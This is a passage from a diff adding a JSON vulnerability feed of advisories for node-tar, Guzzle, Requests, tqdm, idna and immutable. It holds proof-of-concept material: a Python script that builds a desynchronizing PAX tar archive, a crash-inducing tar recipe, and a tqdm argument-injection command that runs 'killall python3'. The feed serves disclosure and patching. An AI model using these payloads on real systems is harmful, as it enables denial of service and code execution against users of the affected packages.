% size).encode(); h[136:148] = b'00000000000\\0'\n    h[156:157] = typeflag; h[257:263] = b'ustar\\0'; h[263:265] = b'00'\n    h[148:156] = b' ' * 8\n    cs = sum(h); h[148:156] = ('%06o\\0 ' % cs).encode()\n    return bytes(h)\n\ndef pad(d):\n    return d + b'\\0' * ((512 - len(d) % 512) % 512)\n\ndef pax_record(key, val):              # length-prefixed PAX record \"LEN key=val\\n\"\n    body = b' %s=%s\\n' % (key.encode(), str(val).encode()); n = len(body)\n    while True:\n        s = str(n).encode() + body\n        if len(s) == n: break\n        n = len(s)\n    return s\n\npax = pax_record('size', 2048)         # malicious: claim size=2048 for the \"next\" entry\nout  = hdr(b'PaxHeaders/x', len(pax), b'x') + pad(pax)\nout += hdr(b'././@LongLink', 13, b'L') + pad(b'longname.txt\\0')\nout += hdr(b'file_a', 16, b'0')        + pad(b'AAAA_file_a_body')\nout += hdr(b'file_b', 16, b'0')        + pad(b'BBBB_file_b_body')\nout += b'\\0' * 1024\nopen('pax-desync.tar', 'wb').write(out)\n```\n\nA negative-control archive is identical except the PAX record is\n`pax_record('comment', 'x')` (no `size=`), written to `pax-control.tar`.\n\n### End-to-end reproduction (against pinned version `tar@7.5.15`, latest release)\n\nInstall the published package into a clean project and parse both archives:\n\n```\n$ npm init -y \u003e/dev/null \u0026\u0026 npm install tar@7.5.15\n$ node -e \"console.log(require('tar/package.json').version)\"\n7.5.15\n$ grep -n \"ex?.size ?? gex?.size\" node_modules/tar/dist/esm/header.js\n49:        this.size = ex?.size ?? gex?.size ?? decNumber(buf, off + 124, 12);\n```\n\n`e2e.mjs`:\n\n```js\nimport * as tar from 'tar'\nasync function listEntries(f){\n  const got=[], warns=[]\n  await tar.list({ file:f, onReadEntry:e=\u003e{ got.push({path:e.path,size:e.size,type:e.type}); e.resume() },\n                   onwarn:(code,_msg)=\u003ewarns.push(code) })\n  return { got, warns }\n}\nconst mal = await listEntries('pax-desync.tar')\nconsole.log('MALICIOUS entries :', JSON.stringify(mal.got), 'warnings:', JSON.stringify(mal.warns))\nconst ctl = await listEntries('pax-control.tar')\nconsole.log('CONTROL  entries :', JSON.stringify(ctl.got), 'warnings:', JSON.stringify(ctl.warns))\n```\n\nVerbatim output:\n\n```\n=== Deployed-consumer E2E: npm tar@7.5.15 (latest release) ===\n\n[MALICIOUS] archive = x(PAX size=2048) -\u003e L(GNU longname \"longname.txt\") -\u003e file_a(16B) -\u003e file_b(16B)\n  tar.list() entries : []\n  tar.list() warnings: [\"TAR_ENTRY_INVALID\"]\n\n[NEGATIVE CONTROL] same archive, PAX record is \"comment=x\" (no size= override)\n  tar.list() entries : [{\"path\":\"longname.txt\",\"size\":16,\"type\":\"File\"},{\"path\":\"file_b\",\"size\":16,\"type\":\"File\"}]\n  tar.list() warnings: []\n```\n\nReference parsers on the **same** `pax-desync.tar`:\n\n```\n$ tar tvf pax-desync.tar\n-rw-r--r--  0 0      0        2048 Jan  1  1970 longname.txt          # GNU tar\n\n$ bsdtar tvf pax-desync.tar\n-rw-r--r--  0 0      0        2048 Jan  1  1970 longname.txt          # libarchive\n\n$ python3 -c \"import tarfile; print([m.name for m in tarfile.open('pax-desync.tar').getmembers()])\"\n['longname.txt']                                                      # Python tarfile\n```\n\nInterpretation differential: GNU tar, libarchive (bsdtar), and Python `tarfile`\nall extract the member `longname.txt` from `pax-desync.tar`, whereas node-tar\n`7.5.15` desynchronizes, raises `TAR_ENTRY_INVALID` (checksum failure from\nlanding mid-stream), and reports **zero** members. The negative control proves\nthe divergence is caused solely by the PAX `size=` override being applied to the\nintermediary `L` header — when the same archive carries a PAX record without\n`size=`, node-tar parses it identically to the reference tools\n(`longname.txt`, `file_b`).\n\n### Suggested fix\n\nWhen decoding a header, do not apply PAX `size` (or other PAX overrides) if the\nheader being decoded is itself an extension header. Concretely, in\n`src/parse.ts` clear/ignore `this[EX]` (and `this[GEX]` for `size`) when the\nheader's type is `ExtendedHeader`, `GlobalExtendedHeader`, `NextFileHasLongPath`\n(GNU `L`), or `NextFileHasLongLinkpath` (GNU `K`); equivalently, in\n`Header.decode`, gate the `ex?.size ?? gex?.size` override on the decoded type\nnot being one of those extension types. This mirrors the upstream Rust fix,\nwhich guards `pax_size` with\n`is_gnu_longname || is_gnu_longlink || is_pax_local_extensions || is_pax_global_extensions`.\n\nA fix PR is being prepared against a private fork and will be linked here.\n\n### Fix PR\n\nTo be linked from a private fork of the repository (the fix will not be pushed\nto any public fork or to upstream during embargo).\n\n### Credits\n\nReported by tonghuaroot.",
+      "advisories": [],
+      "published": "2026-06-15T17:19:42Z",
+      "updated": "2026-06-18T20:29:25Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-w8wr-v893-vjvp",
+      "references": [
+        {
+          "id": "CVE-2026-59871",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "description": "node-tar: Process crash via PAX numeric path type confusion",
+      "detail": "### Summary\n\nA crafted 2.5KB tar archive crashes any Node.js process that extracts it. The PAX header parser coerces all-digit path values to JavaScript numbers, which causes an uncaught TypeError when downstream code calls `.split('/')` on the numeric value. Error handlers and `strict: false` cannot intercept the crash.\n\n### Details\n\nIn `pax.ts` line 180, `parseKV` converts PAX values matching `/^[0-9]+$/` to numbers via `+v`. This applies to all fields including `path` and `linkpath`. When a PAX header sets `path` to an all-digit string like `\"12345\"`, the value becomes the number `12345`.\n\nThis number flows through Header -\u003e ReadEntry -\u003e Unpack.CHECKPATH, where `normalizeWindowsPath(entry.path).split('/')` throws a TypeError because numbers don't have `.split()`.\n\nThe throw is synchronous during event emission and bypasses all error handling:\n- `strict: false` does not help\n- `'error'` event handlers do not catch it\n- `'warn'` handlers do not catch it\n- The TypeError propagates through the event emitter stack as an uncaughtException\n\nDirectory, SymbolicLink, and Link type entries reach CHECKPATH and crash. File type entries crash earlier in Header constructor at `this.path.slice(-1)`, but that throw is caught and emitted as a warning only.\n\n### PoC\n\nCreate a tar archive with a PAX extended header containing an all-digit path:\n\n```\nPAX header body: \"18 path=12345\\n\"\nEntry type: Directory (type '5')\n```\n\nExtract it:\n```js\nconst tar = require('tar');\n\n// All of these crash with TypeError: t.split is not a function\ntar.extract({ file: 'malicious.tar', cwd: '/tmp/test' });\n\n// Error handlers don't help:\ntar.extract({ file: 'malicious.tar', cwd: '/tmp/test', strict: false })\n  .on('error', (err) =\u003e { /* never reached */ })\n  .on('warn', (code, msg) =\u003e { /* never reached */ });\n```\n\nThe archive is ~2.5KB. The crash is deterministic on every attempt.\n\n### Impact\n\nDenial of service. Any application or tool that extracts untrusted tar archives crashes from a single small file. This includes npm (which uses node-tar to extract packages), CI/CD pipelines, file upload processors, and backup tools. The crash cannot be caught by application-level error handling.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59871"
+        }
+      ],
+      "published": "2026-07-20T21:53:14Z",
+      "updated": "2026-07-21T14:59:36Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/tar"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-wm3w-8rrp-j577",
+      "references": [],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "description": "Guzzle: Host-only cookie scope is not preserved",
+      "detail": "### Impact\n\nIn affected versions, `CookieJar` does not preserve whether a response cookie was set without a `Domain` attribute or with an empty one. A cookie without `Domain` is host-only and must be returned only to the exact host that set it. Under current cookie processing rules, an empty `Domain` value is also host-only. Guzzle instead stores the request host in the cookie's `Domain` field and later applies ordinary domain matching, as though the server had supplied a valid domain. For example, a host-only `sid=secret` cookie set by `example.com` can subsequently be sent to `child.example.com`. `FileCookieJar` and `SessionCookieJar` also persist the request host without recording the host-only state, so reloading a jar preserves the widened scope.\n\nAn attacker who controls or can observe a child host can therefore receive cookies that were intended only for its parent host. Depending on the cookie, this can disclose session identifiers, authorization tokens, or other sensitive state. Exploitation requires the application to enable Guzzle's cookie support, reuse the same built-in cookie jar, receive a host-only cookie from a parent host, and later make a matching request to a less-trusted child host. The cookie's other restrictions still apply. Its path must match, a `Secure` cookie is sent only over a secure connection, and an expired cookie is not sent.\n\nApplications that do not use Guzzle's cookie support are not affected. Applications are also not affected by this disclosure if they use a separate jar for every host or trust boundary, never request a less-trusted subdomain with the same jar, or only store cookies carrying a valid, non-empty `Domain` attribute. The incorrect behavior occurs between an otherwise valid parent host and its subdomains.\n\n### Patches\n\nThe issue is patched in `7.15.1` and later. Starting in that release, Guzzle records whether a response cookie is host-only and matches it only against the exact host. The host-only flag is part of cookie identity for replacement and response-driven deletion. Cookies carrying a valid, non-empty `Domain` attribute retain their existing domain-matching behavior. A host-only cookie can coexist with an explicit-domain cookie having the same name, domain string, and path.\n\nThe built-in persistent jars now write a boolean `HostOnly` marker for every stored cookie record. They reject records where that marker is missing or is not a boolean, and validate all records before changing the live jar. Persisted cookie records written by an older version are therefore rejected rather than silently interpreted with an unsafe scope. Loading non-empty file or session data written without this marker throws a `RuntimeException` until the data is deleted, regenerated, or correctly annotated. Versions before `7.15.1` are affected.\n\n### Workarounds\n\nIf you cannot upgrade immediately, do not reuse one `CookieJar` instance across parent and child hosts with different trust levels. Use a separate cookie jar for each host or trust boundary, disable cookie handling for requests to less-trusted hosts, or avoid making those requests through a client configured with a shared jar. In particular, avoid `new Client(['cookies' =\u003e true])` for a client that may contact both a trusted parent host and less-trusted subdomains, because that option creates one jar for the whole client.\n\nWhen upgrading, delete or rotate existing `FileCookieJar` and `SessionCookieJar` data that contains cookie records written without a `HostOnly` marker. Records may instead be annotated manually only when the original presence or absence of the cookie's `Domain` attribute is known. The stored domain string is not sufficient to infer it safely.\n\n### References\n\n* https://www.rfc-editor.org/rfc/rfc10025.html#section-4.1.2.3\n* https://www.rfc-editor.org/rfc/rfc10025.html#section-5.7\n* https://www.rfc-editor.org/rfc/rfc10025.html#section-5.8.3",
+      "advisories": [],
+      "published": "2026-07-20T23:27:49Z",
+      "updated": "2026-07-21T20:59:35Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:composer/guzzlehttp/guzzle"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-x84v-xcm2-53pg",
+      "references": [
+        {
+          "id": "CVE-2018-18074",
+          "source": {}
+        },
+        {
+          "id": "PYSEC-2018-28",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "description": "Insufficiently Protected Credentials in Requests",
+      "detail": "The Requests package through 2.19.1 before 2018-09-14 for Python sends an HTTP Authorization header to an http URI upon receiving a same-hostname https-to-http redirect, which makes it easier for remote attackers to discover credentials by sniffing the network.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-18074"
+        }
+      ],
+      "published": "2018-10-29T19:06:46Z",
+      "updated": "2024-10-21T21:42:55Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/requests"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-xvcm-6775-5m9r",
+      "references": [
+        {
+          "id": "CVE-2026-59880",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv4",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "description": "Immutabl: Hash-collision algorithmic complexity denial of service in Immutable.Map/Set",
+      "detail": "## Summary\n\n`Immutable.Map` and `Immutable.Set` keep keys that share the same 32-bit hash in a collision bucket that is scanned linearly. The string hash is public and deterministic, so an attacker who controls the **keys** inserted into a Map can craft many keys that all collide, degrading insertion and lookup from amortized O(1) to O(n) per operation — and O(n²) to build or read the whole set. A small, attacker-shaped payload can therefore consume disproportionate CPU and, on a single-threaded runtime such as Node.js, stall the event loop and deny service.\n\n## Details\n\nThe string hash uses the JVM-style polynomial `hashed = (31 * hashed + charCode) | 0`. Strings such as `\"Aa\"` and `\"BB\"` hash to the same value (`65*31+97 == 66*31+66 == 2112`), and concatenating such blocks yields `2^n` distinct strings sharing one hash (40 characters ⇒ \u003e1,000,000 colliding keys). \nAll such keys route to a single `HashCollisionNode`, whose `get`/`update` walk the entire bucket testing `is()`. There is no per-process salt, so the colliding set is fully precomputable from the open-source algorithm.\n\n## Proof of concept\n\nInserting N colliding keys (e.g. via `Immutable.Map(obj)` / `Immutable.fromJS(obj)`) is O(N²). Measured on one machine, ~8,000 colliding\nkeys take ~0.7 s to build and ~0.6 s to read, scaling ×4 per doubling; ~16,000 keys exceed several seconds.\n\n## Impact\n\nCPU-bound denial of service in applications that ingest attacker-controlled object **keys** into Immutable structures, e.g. `Immutable.Map(req.body)`, `Immutable.fromJS(req.body)`, `state.merge(userObject)` / `mergeDeep(...)`. Applications that only store attacker input as **values** under fixed keys are not affected.\n\n## Affected versions\n\nAll versions through `5.1.7` (the deterministic string hash and linear collision bucket have existed since the 4.x line).\n\n## Patches\n\nFixed in `5.1.8` _(adjust to the actual release)_: large collision buckets are indexed by a per-process **seeded** secondary hash, restoring near-linear behavior for the affected paths. The public `hash()` is unchanged (no breaking change), and `is()` remains the sole authority on key equality.\n\n## Workarounds\n\nBefore passing untrusted data to Immutable.js: cap request body size, limit object key count/length, and reject high-cardinality payloads; avoid building Maps directly from untrusted object keys.\n\n## References\n\n- CWE-407 (Inefficient Algorithmic Complexity), CWE-400 (Uncontrolled Resource Consumption)\n- OWASP API4:2023 (Unrestricted Resource Consumption)",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59880"
+        }
+      ],
+      "published": "2026-07-21T19:02:33Z",
+      "updated": "2026-07-21T19:15:32Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:npm/immutable"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2017-74",
+      "references": [
+        {
+          "id": "CVE-2016-10075",
+          "source": {}
+        },
+        {
+          "id": "GHSA-r7q7-xcjw-qx8q",
+          "source": {}
+        }
+      ],
+      "ratings": [],
+      "detail": "The tqdm._version module in tqdm versions 4.4.1 and 4.10 allows local users to execute arbitrary code via a crafted repo with a malicious git log in the current working directory.",
+      "advisories": [
+        {
+          "url": "https://security.gentoo.org/glsa/201807-01"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-r7q7-xcjw-qx8q"
+        }
+      ],
+      "published": "2017-01-19T20:59:00Z",
+      "updated": "2026-06-10T17:02:44Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/tqdm"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2018-28",
+      "references": [
+        {
+          "id": "CVE-2018-18074",
+          "source": {}
+        },
+        {
+          "id": "GHSA-x84v-xcm2-53pg",
+          "source": {}
+        }
+      ],
+      "ratings": [],
+      "detail": "The Requests package before 2.20.0 for Python sends an HTTP Authorization header to an http URI upon receiving a same-hostname https-to-http redirect, which makes it easier for remote attackers to discover credentials by sniffing the network.",
+      "advisories": [
+        {
+          "url": "https://access.redhat.com/errata/RHSA-2019:2035"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-x84v-xcm2-53pg"
+        }
+      ],
+      "published": "2018-10-09T17:29:00Z",
+      "updated": "2023-11-08T04:00:04Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/requests"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2023-74",
+      "references": [
+        {
+          "id": "CVE-2023-32681",
+          "source": {}
+        },
+        {
+          "id": "GHSA-j8r2-6x86-q33q",
+          "source": {}
+        }
+      ],
+      "ratings": [],
+      "detail": "Requests is a HTTP library. Since Requests 2.3.0, Requests has been leaking Proxy-Authorization headers to destination servers when redirected to an HTTPS endpoint. This is a product of how we use `rebuild_proxies` to reattach the `Proxy-Authorization` header to requests. For HTTP connections sent through the tunnel, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into the tunneled request. This results in Requests forwarding proxy credentials to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate sensitive information. This issue has been patched in version 2.31.0.\n\n",
+      "advisories": [
+        {
+          "url": "https://github.com/psf/requests/security/advisories/GHSA-j8r2-6x86-q33q"
+        }
+      ],
+      "published": "2023-05-26T18:15:00Z",
+      "updated": "2023-11-08T04:12:35Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/requests"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2026-1872",
+      "references": [
+        {
+          "id": "CVE-2024-47081",
+          "source": {}
+        },
+        {
+          "id": "GHSA-9hjg-9r4m-mvj7",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+        }
+      ],
+      "description": "Requests vulnerable to .netrc credentials leak via malicious URLs",
+      "detail": "### Impact\n\nDue to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.\n\n### Workarounds\nFor older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).\n\n### References\nhttps://github.com/psf/requests/pull/6965\nhttps://seclists.org/fulldisclosure/2025/Jun/2",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-47081"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-9hjg-9r4m-mvj7"
+        }
+      ],
+      "published": "2026-07-07T16:02:54Z",
+      "updated": "2026-07-07T17:47:00Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/requests"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2026-1873",
+      "references": [
+        {
+          "id": "CVE-2024-35195",
+          "source": {}
+        },
+        {
+          "id": "GHSA-9wx4-h78v-vm56",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N"
+        }
+      ],
+      "description": "Requests `Session` object does not verify requests after making first request with verify=False",
+      "detail": "When using a `requests.Session`, if the first request to a given origin is made with `verify=False`, TLS certificate verification may remain disabled for all subsequent requests to that origin, even if `verify=True` is explicitly specified later.\n\nThis occurs because the underlying connection is reused from the session's connection pool, causing the initial TLS verification setting to persist for the lifetime of the pooled connection. As a result, applications may unintentionally send requests without certificate verification, leading to potential man-in-the-middle attacks and compromised confidentiality or integrity.\n\nThis behavior affects versions of `requests` prior to 2.32.0.",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-35195"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-9wx4-h78v-vm56"
+        }
+      ],
+      "published": "2026-07-07T11:45:42Z",
+      "updated": "2026-07-07T17:46:36Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/requests"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2026-1976",
+      "references": [
+        {
+          "id": "CVE-2024-34062",
+          "source": {}
+        },
+        {
+          "id": "GHSA-g7vv-2v7x-gj9p",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N"
+        }
+      ],
+      "description": "tqdm CLI arguments injection attack",
+      "detail": "### Impact\nAny optional non-boolean CLI arguments (e.g. `--delim`, `--buf-size`, `--manpath`) are passed through python's `eval`, allowing arbitrary code execution. Example:\n\n```sh\npython -m tqdm --manpath=\"\\\" + str(exec(\\\"import os\\nos.system('echo hi \u0026\u0026 killall python3')\\\")) + \\\"\"\n```\n\n### Patches\nhttps://github.com/tqdm/tqdm/commit/4e613f84ed2ae029559f539464df83fa91feb316 released in `tqdm\u003e=4.66.3`\n\n### Workarounds\nNone\n\n### References\n- https://github.com/tqdm/tqdm/releases/tag/v4.66.3",
+      "advisories": [
+        {
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-34062"
+        },
+        {
+          "url": "https://github.com/advisories/GHSA-g7vv-2v7x-gj9p"
+        }
+      ],
+      "published": "2026-07-07T11:45:41Z",
+      "updated": "2026-07-07T17:48:11Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/tqdm"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2026-215",
+      "references": [
+        {
+          "id": "CVE-2026-45409",
+          "source": {}
+        },
+        {
+          "id": "GHSA-65pc-fj4g-8rjx",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+        }
+      ],
+      "detail": "Internationalized Domain Names in Applications (IDNA) for Python provides support for Internationalized Domain Names in Applications (IDNA) and Unicode IDNA Compatibility Processing. In versions prior to 3.15, payloads such as `\"\\u0660\" * N` or `\"\\u30fb\" * N + \"\\u6f22\"` utilize the `valid_contexto` function prior to length rejection, and for high values of `N` will take a long time to process. This is the same issue as CVE-2024-3651, however the original remediation in 2024 was not a complete fix. A specially crafted argument to the `idna.encode()` function could consume significant resources. This may lead to a denial-of-service. Starting in version 3.14, the function rejects long inputs as soon as practicable prior to any further processing to minimize resource consumption. In version 3.15, this approach was extended to lesser used alternate functions (i.e. per-label conversions and codec support). A workaround is available. Domain names cannot exceed 253 characters in length. If this length limit is enforced prior to passing the domain to the `idna.encode()` function, it should no longer consume significant resources. This is triggered by arbitrarily large inputs that would not occur in normal usage, but may be passed to the library assuming there is no preliminary input validation by the higher-level application.",
+      "advisories": [
+        {
+          "url": "https://github.com/kjd/idna/security/advisories/GHSA-65pc-fj4g-8rjx"
+        }
+      ],
+      "published": "2026-06-05T23:16:43Z",
+      "updated": "2026-06-16T16:15:04Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/idna"
+        }
+      ]
+    },
+    {
+      "id": "PYSEC-2026-2275",
+      "references": [
+        {
+          "id": "CVE-2026-25645",
+          "source": {}
+        },
+        {
+          "id": "GHSA-gc5v-m9x4-r6x2",
+          "source": {}
+        }
+      ],
+      "ratings": [
+        {
+          "method": "CVSSv3",
+          "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N"
+        }
+      ],
+      "detail": "Requests is a HTTP library. Prior to version 2.33.0, the `requests.utils.extract_zipped_paths()` utility function uses a predictable filename when extracting files from zip archives into the system temporary directory. If the target file already exists, it is reused without validation. A local attacker with write access to the temp directory could pre-create a malicious file that would be loaded in place of the legitimate one. Standard usage of the Requests library is not affected by this vulnerability. Only applications that call `extract_zipped_paths()` directly are impacted. Starting in version 2.33.0, the library extracts files to a non-deterministic location. If developers are unable to upgrade, they can set `TMPDIR` in their environment to a directory with restricted write access.",
+      "advisories": [
+        {
+          "url": "https://github.com/psf/requests/releases/tag/v2.33.0"
+        },
+        {
+          "url": "https://github.com/psf/requests/security/advisories/GHSA-gc5v-m9x4-r6x2"
+        }
+      ],
+      "published": "2026-03-25T17:16:52Z",
+      "updated": "2026-07-13T07:15:43Z",
+      "credits": {
+        "organizations": []
+      },
+      "affects": [
+        {
+          "ref": "pkg:pypi/requests"
+        }
+      ]
+    }
+  ]
+}
